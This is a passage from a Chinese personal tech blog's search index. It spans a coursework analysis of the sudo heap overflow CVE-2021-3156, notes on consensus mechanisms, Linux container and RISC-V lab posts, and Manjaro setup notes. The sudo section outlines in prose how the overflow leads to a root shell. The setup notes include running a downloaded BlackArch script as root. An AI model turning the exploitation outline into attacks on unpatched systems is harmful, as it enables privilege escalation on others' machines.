*from++这一条指令处再次使得from指针指向下一位置，发生指针越界，这时不会跳出循环，而是会继续拷贝后续内容，将后面的内容复制到user_args堆块中，发生堆溢出。 为了使得程序执行到这一分支，需要满足如下条件： // parse_args !((ISSET(mode, MODE_RUN) \u0026\u0026 ISSET(flags, MODE_SHELL)) //避免代码执行，对命令行中所有的参数进行转义 //sudoers_policy_main sudo_mode \u0026 (MODE_RUN | MODE_EDIT | MODE_CHECK) ISSET(sudo_mode, MODE_SHELL | MODE_LOGIN_SHELL) 即要求!MODE_RUN) \u0026 MODE_EDIT \u0026 MODE_SHELL \u0026 MODE_LOGIN。在parse_args.c中查找参数配置情况。在各种参数配置中，发现执行sudoedit时满足上述条件，可以正常执行到堆溢出的部分。 之后的工作就是利用这个堆溢出获得root shell。具体的实现细节十分复杂，利用了nss库，大致思路为利用nss在加载动态库时会将名字信息存在堆上，通过拼接得到动态链接库的全称，然后加载，如果我们能够利用堆溢出使其加载我们构造的恶意动态链接库，就可以执行任意代码。而为了能够覆盖到nss中用到的结构体，需要我们的堆块位于其前方不远处。PoC中的方法为利用setlocale获得free原语，利用其对于换进见变量的匹配机制将分配堆块后再释放掉，这样我们后面分配堆块时能够复用这一堆块，实现溢出。 具体的细节见这里的writeup。 缓解措施：临时禁用危险的sudoedit命令或者升级至新版本的sudo。 根据sudo官网的更新日志来看，其针对CVE-2021-3156的修改主要如下： When invoked as sudoedit, the same set of command line options are now accepted as for sudo -e. The -H and -P options are now rejected for sudoedit and sudo -e which matches the sudo 1.7 behavior. This is part of the fix for CVE-2021-3156. Fixed a potential buffer overflow when unescaping backslashes in the command’s arguments. Normally, sudo escapes special characters when running a command via a shell (sudo -s or sudo -i). However, it was also possible to run sudoedit with the -s or -i flags in which case no escaping had actually been done, making a buffer overflow possible. This fixes CVE-2021-3156. 即禁用了相关的选项，使原来的堆溢出问题不再可能发生。 ","date":"2021-04-09","objectID":"/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8hw1/:4:0","tags":["ctf","hw","pwn"],"title":"软件安全hw1","uri":"/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8hw1/"},{"categories":["Block Chain"],"content":"共识机制概念梳理 区块链系统作为一个分布式系统，受限于网络延迟和停电断电等极端情况，为了维持一个一致的系统，首先要解决一致性问题。与此同时，区块链系统又具有去中心化的特征，各个节点相对独立，没有中心节点对于其他节点的恶意行为进行约束。在这样的背景下，需要设立一套制度，使得众多节点能够有序的改变系统的状态，同时使得系统的一致性的以保证。 ","date":"2021-03-17","objectID":"/consensus/:0:0","tags":["共识机制"],"title":"共识机制概念梳理","uri":"/consensus/"},{"categories":["Block Chain"],"content":"共识 共识，关注的是多个提议者达成一致的过程，共识算法本质上解决的是如何在分布式系统下保证所有节点共同认可某个结果，其中需要考虑节点宕机，网络时延，网络分区等各种问题。 ","date":"2021-03-17","objectID":"/consensus/:1:0","tags":["共识机制"],"title":"共识机制概念梳理","uri":"/consensus/"},{"categories":["Block Chain"],"content":"CAP定理 理想化的场景下，整个系统中所有节点的数据都是相同的，可以任何节点读取或写入数据，产生的效果相同（一致性）；即使某些节点出现故障，系统依然能够正确响应用户请求（可用性）；即使两个节点发生分区，或者说通信中断，集群依然可以继续运行（分区容限）。而由Eric Brewer提出，Lynch等人证明的CAP定理明确了这三种性质不可兼得。所有可用的组合包括： CA：所有节点之间的数据都是一致的，只要所有节点都处于联机状态，就可以从任何节点进行读/写操作，并确保数据相同，但是如果节点之间发生分区，则数据将是不同步（解决分区后将不会重新同步）。 CP：所有节点之间的数据都是一致的，并且当节点发生故障时变得不可用，从而保持分区容限（防止数据失步）。 AP：节点即使无法彼此通信也将保持联机状态，并且在解析分区后将重新同步数据，但是不能保证所有节点（在分区期间或分区之后）都具有相同的数据 同时满足一致性，可用性和分区容限的系统是并不存在的。假设存在三个节点${A, B, C}$用于维护同一份数据，处于某种原因，$C$和${A, B}$当一个写请求到达$C$并要求更新其状态时，$C$存在两种选择： 即使知道A和B无法同步更新数据仍然接收该请求。 拒绝请求，等待与A，B恢复通信后提供服务。 选择前者，即选择可用性而放弃了一致性；选择后者，即选择一致性而放弃了可用性，两者不可兼得。实际上在大规模的分布式应用当中，网络不可靠几乎不可避免，即分区容限是必须的选择，因此C和A不可兼得，系统设计者必须在AP和CP之间权衡[1]。 对于CAP定理的使用的解释和应用，应当落脚于当出现问题时，在三种性质中在哪一方面做出妥协：不保证线性一致性、不保证完全的可用性、或者对于网络状况做提出更高的要求，而不是在三者之中选择提供哪两者。 由于CAP中对C和A的定义过度理想化，有人提出了BASE理论，只要求基本可用（Basically Available）、软状态（Soft State）、最终一致性（Eventual Consistency）。核心思想在于即使无法做到强一致性，仍可以根据业务特性，使用适当的方式使得系统达到最终一致性。许多分布式系统都是基于“基本可用”和“最终一致性”来构建的。关于一致性模型的讨论，在这篇文章[2]中有更深入的讨论。 总而言之，在共识机制的设计中，也涉及到一系列的妥协，追求的是在各个目标之间找到某种平衡。 ","date":"2021-03-17","objectID":"/consensus/:1:1","tags":["共识机制"],"title":"共识机制概念梳理","uri":"/consensus/"},{"categories":["Block Chain"],"content":"共识机制 即达成共识的机制，依据系统对故障组件的容错能力分为崩溃容错协议(crash fault tolerant,CFT)和拜占庭容错协议（Byzantine fault tolerant,BFT)[3]。 在崩溃容错协议中，如果组件出现故障，系统仍能够正确的达成共识。拜占庭容错协议中，即使存在恶意节点，系统仍能够正确工作。二者的区别主要在于对于威胁/错误模型的不同假设。[4] CFT can withstand up to N/2 system failures, while no guarantees on adversary nodes. BFT provides with guarantees to withstand and correctly reach consensus in presence of N/3 failures of any kind including Byzantine. You can think of it as two phase commit versus three phase commit. PoW的机制在wiki[5]中有清晰的描述。 PoS的思想在这篇博客中[6]有深入的思考。核心思想在于在PoW机制中，攻击者和防御者的代价可能是一比一的，对于一个攻击者的51%攻击，需要整个社区几乎相等的算力以挽回其代价，而PoS中，攻击者作恶的代价远高于防御者，与此同时，攻击者的攻击行为带来的收益相对较小。当一个攻击者的攻击行为被发现之后，社区只需要对链做一次分叉，则攻击者的投入以及其收益即全部报销，而对于其他人以及整个系统而言，并没有带来显著的影响，主要思想是通过经济学原理限制作恶。 ","date":"2021-03-17","objectID":"/consensus/:2:0","tags":["共识机制"],"title":"共识机制概念梳理","uri":"/consensus/"},{"categories":["Block Chain"],"content":"参考资料 [1]You Can’t Sacrifice Partition Tolerance [2]一致性杂谈 [3]Wikipedia 共识机制 [4]Byzantine fault tolerance (BFT) and Crash fault tolerance (CFT) [5]Wikipedia 工作量证明 [6]A proof of stake design philosophy ","date":"2021-03-17","objectID":"/consensus/:3:0","tags":["共识机制"],"title":"共识机制概念梳理","uri":"/consensus/"},{"categories":["misc"],"content":"在Manjaro下运行一个Ubuntu 在物理机上安装了两个Linux发行版，以应对不同的应用需求，但相互切换频繁操作繁琐，于是开始折腾如何在已经启动一个Linux安装之后使用安装在另一个分区的Linux发行版。 ","date":"2020-10-19","objectID":"/systemd-nspawn/:0:0","tags":["Manjaro"],"title":"在Manjaro下运行一个Ubuntu","uri":"/systemd-nspawn/"},{"categories":["misc"],"content":"1 方案一：修改fstab挂载分区 直接打开Manjaro后，在文件管理器中可以直接打开Ubuntu所在的分区，但是由于每次动态挂载回导致路径不固定，不方便于后续的折腾。可在/etc/fstab文件中添加对于Ubuntu所在分区的挂载，将其挂载到固定的位置。 使用lsblk -f命令找到相应分区的UUID，在/etc/fstab文件中添加挂载的配置条目。 UUID=\u003cUUID\u003e /ubuntu ext4 defaults,noatime 0 1 挂载后，部分软件已经可以直接使用了，例如基于Java的Vivado，在挂载之后可以直接在其安装目录下运行命令，打开图形界面进行使用。但这是因为Vivado是跑在Java虚拟机中的，本机安装了Java之后不需要额外的依赖环境。尝试执行ELF格式的软件时，将会发现部分软件缺少依赖的动态库而无法直接运行，这时仅挂载目录的方案就不能完全解决问题了。 ","date":"2020-10-19","objectID":"/systemd-nspawn/:1:0","tags":["Manjaro"],"title":"在Manjaro下运行一个Ubuntu","uri":"/systemd-nspawn/"},{"categories":["misc"],"content":"2 方案二：mount+chroot 将主机的/proc目录/sys目录/run/udev目录/dev目录绑定到Ubuntu文件系统的相应位置，注意由于这些目录均为虚拟文件目录，不必担心这样的绑定破坏了Ubuntu文件系统的完整性。 mount -t proc /proc /ubuntu/proc mount --rbind /dev /ubuntu/dev mount --bind /run /ubuntu/run mount --bind /tmp /ubuntu/tmp 在host操作系统中打开一个新的Xserver并监听，注意需要先使用xhost允许来自localhost的连接。 sudo xhost +local: sudo X -quiet -nolisten tcp -noreset :1 vt2 chroot到Ubuntu操作系统中之后指定使用的DISPLAY端口，即可在相应的tty中执行GUI应用程序。 例如：DISPLAY=:1 firefox。或者也可以直接指定DISPLAY=:0，使用主机的桌面环境。 这一方法可以支撑ELF格式的软件的执行，但问题在于可能没有办法使用网络。 ","date":"2020-10-19","objectID":"/systemd-nspawn/:2:0","tags":["Manjaro"],"title":"在Manjaro下运行一个Ubuntu","uri":"/systemd-nspawn/"},{"categories":["misc"],"content":"3 方案三：systemd-nspawn 直接使用systemd-nspawn指令，可用于在一个轻量命名空间容器中运行命令或操作系统。它比 chroot 更强大在于它完全虚拟化了文件系统层次结构、进程树、各种 IPC 子系统以及主机和域名。 通过该指令可直接在container中运行一个受限的Ubuntu操作系统，通过systemd-nspawn，可以直接在另一个tty中打开一个ubuntu的gnome桌面。 将操作封装为函数添加到.zshrc以便重用。 function spawn_ubuntu() { sudo xhost +local: sudo X -quiet -nolisten tcp -noreset :1 vt2 \u003e\u003e /dev/null 2\u003e\u00261 \u0026#打开Xserver sudo systemd-nspawn -bD /ubuntu \\ --bind=/lib/modules \\ --bind-ro=/tmp/.X11-unix \\ --bind=/mnt #非必要 } 在终端中直接输入spawn_ubuntu便可直接使用Ubuntu了，终端中登录后使用 DISPLAY=:1 gnome-session 在tty2中打开gnome桌面环境，通过Ctrl + Alt + \u003ctty_num\u003e在不同的tty之间进行切换。 ","date":"2020-10-19","objectID":"/systemd-nspawn/:3:0","tags":["Manjaro"],"title":"在Manjaro下运行一个Ubuntu","uri":"/systemd-nspawn/"},{"categories":["misc"],"content":"参考文献 fstab wiki Chroot with second desktop environment - Howto and notes systemd-nspawn wiki ","date":"2020-10-19","objectID":"/systemd-nspawn/:4:0","tags":["Manjaro"],"title":"在Manjaro下运行一个Ubuntu","uri":"/systemd-nspawn/"},{"categories":["OS"],"content":"RISC-V 特权级切换 UCAS的计算机专业操作系统实验中要求实现sleep系统调用，涉及到RISC-V的一些细节，需要阅读手册理解该指令集下的工作机制，在此做一总结。 ","date":"2020-10-18","objectID":"/riscv-syscall/:0:0","tags":["Lab"],"title":"RISC-V 特权级切换","uri":"/riscv-syscall/"},{"categories":["OS"],"content":"1 切换运行模式至用户态 实验手册的注意事项中给出了如下提示： RISC-V 在所有特全级下都用ecall执行系统调用。Supervisor态ecall会触发machine态的例外，user态的ecall会触发supervisor态的中断。所以大家务必注意，要让USER模式的进程/线程运行在用户态。 Supervisor模式和User模式的切换是后续顺利实验的关键。《RISC-V手册》第10章关于特权架构的介绍中提到： S 模式有几个异常处理 CSR:sepc、stvec、scause、sscratch、stval 和 sstatus,它们执行与 M 模式 CSR 相同的功能。监管者异常返回指令 sret 与 mret 的行为相同,但它作用于 S 模式的异常处理 CSR,而不是 M 模式的 CSR。S 模式处理例外的行为已和 M 模式非常相似。如果 hart 接受了异常并且把它委派给了S 模式,则硬件会原子地经历几个类似的状态转换,其中用到了 S 模式而不是 M 模式的CSR: 发生例外的指令的 PC 被存入 sepc,且 PC 被设置为 stvec。 scause 根据异常类型设置,stval 被设置成出错的地址或者其它特定异常的信息字。 把 sstatus CSR 中的 SIE 置零,屏蔽中断,且 SIE 之前的值被保存在 SPIE 中。 发生例外时的权限模式被保存在 sstatus 的 SPP 域,然后设置当前模式为 S 模式。 这一部分描述了从User模式进入到Supervisor模式的过程中硬件的处理机制，从Supervisor模式返回User模式的过程手册中没有直接介绍，但可以通过对mret的介绍了解其工作方式。 处理程序用 mret 指令(M 模式特有的指令)返回。mret 将 PC 设置为 mepc,通过将 mstatus 的 MPIE 域复制到MIE 来恢复之前的中断使能设置,并将权限模式设置为 mstatus 的 MPP 域中的值。 这基本是前一段中描述的逆操作。 显然想要将运行模式切换到用户态，需要的指令就是sret了。 在执行sret之前，需要准备好sepc，sstatus寄存器，这一部分寄存器应当在恢复上下文时完成，需要特别关注sstatus的SPIE位以及SPP位，这为初始化PCB时的设计给出了提示。具体实现可通过阅读手册中对于sret指令的说明得到一些提示。 ","date":"2020-10-18","objectID":"/riscv-syscall/:1:0","tags":["Lab"],"title":"RISC-V 特权级切换","uri":"/riscv-syscall/"},{"categories":["OS"],"content":"2 系统调用 ecall指令我们在Project 1的SBI_CALL中见到过，当时的用法是通过寄存器传参后调用sbi函数，这是在Supervisor模式下的行为。如果读者在没有完成上下文切换的时候尝试过使用ecall指令触发中断，并仔细调试的话，预期触发中断的地方很可能直接执行了一个sbi函数。而若已经正确切换到User模式，将会跳转到stvec继续执行，异常类型存放在scause中，stval 被设置成出错的地址或者其它特定异常的信息字。后续系统调用的实现就很简单了，不再赘述。 祝大家实验顺利。 ","date":"2020-10-18","objectID":"/riscv-syscall/:2:0","tags":["Lab"],"title":"RISC-V 特权级切换","uri":"/riscv-syscall/"},{"categories":["OS"],"content":"3 参考文献 RISC-V 手册 P2-Guidebook-RISCV ","date":"2020-10-18","objectID":"/riscv-syscall/:3:0","tags":["Lab"],"title":"RISC-V 特权级切换","uri":"/riscv-syscall/"},{"categories":["OS"],"content":"操作系统实验环境配置 操作系统实验中，利用qemu运行RISCV架构下的操作系统，gdb远程调试。利用vscode给gdb提供图形界面的支持可以极大的改善调试体验。 ","date":"2020-10-17","objectID":"/%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/:0:0","tags":["Lab"],"title":"内核调试环境配置","uri":"/%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"},{"categories":["OS"],"content":"1 安装Native Debug插件 Native DebugNative Debug \" Native Debug ","date":"2020-10-17","objectID":"/%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/:1:0","tags":["Lab"],"title":"内核调试环境配置","uri":"/%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"},{"categories":["OS"],"content":"2 配置Lauch.json { \"version\": \"0.2.0\", \"configurations\": [ { \"type\": \"gdb\", \"request\": \"attach\", \"name\": \"Attach to QEMU\", //替换为自己的可执行文件路径 \"executable\": \"${workspaceFolder}/prj2/main\", //将端口替换为当前实验中qemu打开的端口，例如xv6习惯于使用26000 \"target\": \"localhost:1234\", \"remote\": true, \"cwd\": \"${workspaceRoot}\", //替换为相应的gdb可执行文件的地址 \"gdbpath\": \"/riscv64-linux/bin/riscv64-unknown-linux-gnu-gdb\", \"autorun\": [ //添加其他需要的文件提供调试信息 \"add-symbol-file ${workspaceFolder}/prj2/bootblock\", //在入口函数下断点 \"b _start\" ] }, ] } ","date":"2020-10-17","objectID":"/%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/:2:0","tags":["Lab"],"title":"内核调试环境配置","uri":"/%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"},{"categories":["OS"],"content":"3 愉快调试 在终端中启动qemu后，F5打开调试器，程序将自动停止在设定的断点处。 debugdebug \" debug Tips: 使用侧边栏调试窗口中的Call Stack查看调用栈 Debug Console中照常使用gdb打印信息 在.gdbinit中自定义宏，打印信息,例如: define plist set $hd = (list_node_t*)\u0026ready_queue set $nd = ready_queue-\u003enext while($nd != $hd) p/x $nd set $nd = ((list_node_t*)$nd)-\u003enext end end define pcur printf \"current_running-\u003ekernel_sp= %lx\",current_running-\u003ekernel_sp printf \"current_running-\u003euser_sp= %lx\",current_running-\u003euser_sp printf \"context:\\n\" x/36gx current_running-\u003ekernel_sp end 示例： pcurpcur \" pcur 祝大家调试愉快。 ","date":"2020-10-17","objectID":"/%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/:3:0","tags":["Lab"],"title":"内核调试环境配置","uri":"/%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"},{"categories":["环境配置"],"content":"Configure manjaro ","date":"2020-09-01","objectID":"/manjaro-configure/:0:0","tags":["Manjaro"],"title":"Manjaro","uri":"/manjaro-configure/"},{"categories":["环境配置"],"content":"Change sources ","date":"2020-09-01","objectID":"/manjaro-configure/:1:0","tags":["Manjaro"],"title":"Manjaro","uri":"/manjaro-configure/"},{"categories":["环境配置"],"content":"rank mirrors sudo pacman-mirrors -i -c China -m rank sudo pacman -Syu ","date":"2020-09-01","objectID":"/manjaro-configure/:1:1","tags":["Manjaro"],"title":"Manjaro","uri":"/manjaro-configure/"},{"categories":["环境配置"],"content":"change the gem source gem sources --add https://mirrors.tuna.tsinghua.edu.cn/rubygems/ --remove https://rubygems.org/ ","date":"2020-09-01","objectID":"/manjaro-configure/:1:2","tags":["Manjaro"],"title":"Manjaro","uri":"/manjaro-configure/"},{"categories":["环境配置"],"content":"change the npm source npm install -g nrm // 全局安装nrm模块 nrm ls // 显示所有可用的源 nrm use taobao // 切换到淘宝源： ","date":"2020-09-01","objectID":"/manjaro-configure/:2:0","tags":["Manjaro"],"title":"Manjaro","uri":"/manjaro-configure/"},{"categories":["环境配置"],"content":"change the bundle source bundle config mirror.https://rubygems.org https://mirrors.tuna.tsinghua.edu.cn/rubygems ","date":"2020-09-01","objectID":"/manjaro-configure/:3:0","tags":["Manjaro"],"title":"Manjaro","uri":"/manjaro-configure/"},{"categories":["环境配置"],"content":"add archlinuxcn and arch4edu #edit /etc/pacman.conf #append the following content [archlinuxcn] SigLevel = Optional TrustedOnly Server = http://mirrors.ustc.edu.cn/archlinuxcn/$arch [arch4edu] SigLevel = Never Server = http://mirrors.tuna.tsinghua.edu.cn/arch4edu/$arch add the archlinuxcn-keyring sudo pacman -S archlinuxcn-keyring sudo pacman -Syu ","date":"2020-09-01","objectID":"/manjaro-configure/:3:1","tags":["Manjaro"],"title":"Manjaro","uri":"/manjaro-configure/"},{"categories":["环境配置"],"content":"add blackarch # Run https://blackarch.org/strap.sh as root and follow the instructions. $ curl -O https://blackarch.org/strap.sh # The SHA1 sum should match: 9f770789df3b7803105e5fbc19212889674cd503 strap.sh $ sha1sum strap.sh # Set execute bit $ chmod +x strap.sh # Run strap.sh $ sudo ./strap.sh #change the source #edit the /etc/pacman.conf [blackarch] SigLevel = Optional TrustAll Server = https://mirrors.ustc.edu.cn/blackarch/$repo/os/$arch # add keyring first ","date":"2020-09-01","objectID":"/manjaro-configure/:3:2","tags":["Manjaro"],"title":"Manjaro","uri":"/manjaro-configure/"},{"categories":["环境配置"],"content":"Necessary software zsh sudo pacman -S manjaro-zsh-config chsh -s /bin/zsh yay sudo pacman -S yay chrome typora nvim code anaconda goldendict sudo pacman -S google-chrome typora code goldendict rime-pinyin sudo pacman -S fctix-rime kcm-fcitx fcitx-gtk2 fcitx-gtk3#need to log out gdb\u0026radare2\u0026pwntools sudo pacman -S pwndbg peda gef radare2 ghidra sudo pacman -S ghidra vmware sudo pacman -S vmware-workstation Remember to install the right linux-headers before using vmware, and start the networking. systemctl start vmware-networks.service systemctl enable vmware-networks.service metasploit sudo pacman -S msfdb metasploit ","date":"2020-09-01","objectID":"/manjaro-configure/:4:0","tags":["Manjaro"],"title":"Manjaro","uri":"/manjaro-configure/"},{"categories":["环境配置"],"content":"Configure the environment asystem time synchronize sudo timedatectl set-local-rtc true mount the windows partion UUID=0CB47F55B47F406E /mnt/C ntfs-3g defaults 0 0 UUID=585245C85245AB96 /mnt/D ntfs-3g defaults 0 0 ","date":"2020-09-01","objectID":"/manjaro-configure/:5:0","tags":["Manjaro"],"title":"Manjaro","uri":"/manjaro-configure/"},{"categories":["环境配置"],"content":"Backup backup with clonezilla restore the grub ","date":"2020-09-01","objectID":"/manjaro-configure/:6:0","tags":["Manjaro"],"title":"Manjaro","uri":"/manjaro-configure/"}]